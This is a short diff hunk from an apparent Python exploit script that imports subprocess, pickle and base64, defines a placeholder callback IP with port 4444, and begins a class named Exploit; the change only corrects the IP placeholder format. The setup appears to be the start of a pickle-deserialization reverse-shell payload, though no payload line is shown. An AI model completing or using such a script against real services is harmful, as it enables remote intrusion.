@@ -5,7 +5,7 @@ import subprocess
 import pickle
 import base64
 
-IP = 'XXX.XXX.XXX'
+IP = 'XXX.XXX.XXX.XXX'
 PORT = 4444
 
 class Exploit(object):
